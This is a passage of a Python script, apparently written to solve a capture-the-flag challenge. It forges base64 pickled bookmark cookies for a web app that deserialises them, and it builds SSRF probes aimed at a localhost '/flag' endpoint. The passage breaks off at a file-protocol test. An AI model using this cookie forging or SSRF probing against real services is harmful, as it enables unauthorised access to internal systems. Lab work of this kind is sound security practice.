class UrlObj:
    def __init__(self, name, url):
        self.name = name
        self.url = url
    
    def __repr__(self):
        return f"UrlObj(name={self.name}, url={self.url})"

# Create a test bookmark instance
bookmark = UrlObj(name="Test", url="http://example.com")

# Put it in a list (as the cookie expects a list of bookmarks)
bookmarks_list = [bookmark]

# Pickle it with protocol 4
pickled_data = pickle.dumps(bookmarks_list, protocol=4)

# Base64 encode it
encoded_cookie = base64.b64encode(pickled_data).decode('utf-8')

print("[+] Created valid pickled bookmark object")
print(f"[+] Bookmark: {bookmark}")
print(f"[+] Pickled data (hex): {pickled_data.hex()}")
print(f"[+] Base64 encoded cookie value:")
print(encoded_cookie)

# Verify we can unpickle it
decoded = base64.b64decode(encoded_cookie)
unpickled = pickle.loads(decoded)
print(f"\n[+] Verification - Unpickled object: {unpickled}")
print(f"[+] First bookmark name: {unpickled[0].name}")
print(f"[+] First bookmark url: {unpickled[0].url}")

# Create a second test case with multiple bookmarks
bookmarks_multiple = [
    UrlObj(name="Google", url="http://google.com"),
    UrlObj(name="Example", url="http://example.com")
]
pickled_multiple = pickle.dumps(bookmarks_multiple, protocol=4)
encoded_multiple = base64.b64encode(pickled_multiple).decode('utf-8')

print(f"\n[+] Multiple bookmarks cookie value:")
print(encoded_multiple)

# Create SSRF test bookmark - internal localhost probe
ssrf_test = [
    UrlObj(name="SSRF Test", url="http://127.0.0.1:8080/flag")
]
pickled_ssrf = pickle.dumps(ssrf_test, protocol=4)
encoded_ssrf = base64.b64encode(pickled_ssrf).decode('utf-8')

print(f"\n[+] SSRF test bookmark (localhost probe) cookie value:")
print(encoded_ssrf)

# Create SSRF test bookmark - file protocol test
ssrf_file = [
